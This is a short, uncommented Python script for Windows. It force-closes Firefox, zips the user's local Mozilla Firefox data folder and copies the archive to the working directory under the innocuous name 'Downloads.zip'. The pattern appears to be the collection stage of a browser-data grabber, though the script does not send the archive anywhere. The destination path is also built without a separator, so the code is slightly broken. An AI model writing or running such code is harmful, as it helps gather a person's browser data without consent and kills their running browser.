import os
import shutil

user =  os.getlogin()
drive = os.getenv("SystemDrive")
drive1 = os.getcwd()
path2 = drive + "//Users/" + user + "/AppData/Local/Mozilla"


os.chdir(path2)

os.system('TASKKILL /F /IM firefox.exe')
root_directory='Firefox'
shutil.make_archive("Firefox","zip",root_directory)
shutil.copy(src="Firefox.zip", dst=drive1+"Downloads.zip")  